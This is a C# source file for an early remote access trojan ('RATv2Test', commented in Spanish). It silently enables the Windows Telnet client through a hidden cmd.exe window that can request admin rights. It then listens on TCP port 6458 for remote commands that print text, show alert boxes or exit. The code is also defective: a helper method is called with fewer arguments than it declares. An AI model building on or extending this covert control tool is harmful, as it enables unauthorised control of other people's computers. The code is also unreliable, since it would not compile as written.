using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Net.Sockets;
using System.Net;
using System.Windows.Forms;
/**
 * Este progrma recibe comandos a partir de cmd
 * Cosas a tener en cuenta: ipadress variable, puerto
 * 
 * */
namespace RATv2Test
{
    class Program
    {
        static void Main(string[] args)
        {
            string line;
            string command = "";//alamcena el comando
            string data = "";//alamcena los que le sigue al comando
            char[] separator = ":".ToCharArray();//":" será el separador, pero para utilizarlo tengo que pasarlo a char[]
            bool sw = true;
            int port = 6458;
            bool networkAvailabilty = System.Net.NetworkInformation.NetworkInterface.GetIsNetworkAvailable();

            //Instalo en segundo plano el complemento Telnet para poder controlar el cliente
            ExecuteCMD("dism /online /Enable-Feature /FeatureName:TelnetClient");

            //Imprimo si estoy conectado a internet 
            Console.WriteLine(">>Network available: " + networkAvailabilty + " at " + DateTime.Now.ToString());

            //Consigo la Ipv4, si es que estoy conetado
            if (networkAvailabilty)
            {
                string MyIpv4 = GetLocalIPAddress();
                Console.WriteLine(">>My Ipv4: " + MyIpv4);
            }

            //Network shit
            TcpListener tcpListener = new TcpListener(IPAddress.Any, port);
            tcpListener.Start();

            Socket socketForClient = tcpListener.AcceptSocket();

            NetworkStream networkstream = new NetworkStream(socketForClient);
            StreamReader streamreader = new StreamReader(networkstream);

            //Recividor de comandos
            while (sw == true)
            {
                line = "";
                line = streamreader.ReadLine();

                Console.WriteLine(">> '" + line + "' from Port " + port + " at " + DateTime.Now.ToString());

                if (line != null)
                {
                    //Separo el comando según ":"
                    string[] temp = line.Split(separator);
                    command = temp[0];
                    data = temp[1];

                    //Análisis del mensaje
                    switch (command)
                    {
                        case ("msg"):
                            Console.WriteLine(data);
                            break;
                        case ("exit"):
                            Environment.Exit(1);
                            break;
                        case ("alert msg"):
                            MessageBox.Show(data, "Alert", MessageBoxButtons.YesNo,MessageBoxIcon.Exclamation);
                            break;
                    }
                }
                else
                {
                    sw = false;
                }
            }

        
        }
        public static string GetLocalIPAddress()
        {
            var host = Dns.GetHostEntry(Dns.GetHostName());
            foreach (var ip in host.AddressList)
            {
                if (ip.AddressFamily == AddressFamily.InterNetwork)
                {
                    return ip.ToString();
                }
            }
            throw new Exception("No network adapters with an IPv4 address in the system!");
        }

        public static void ExecuteCMD(string comm, bool admin)
        {

            System.Diagnostics.Process process = new System.Diagnostics.Process();
            System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
            startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
            startInfo.FileName = "cmd.exe";
            startInfo.Arguments = "/C " + comm;
            if(admin == true) startInfo.Verb = "runas";
            process.StartInfo = startInfo;
            try
            {
                process.Start();
            }
            catch (Exception ex) { }
        }
    }
}
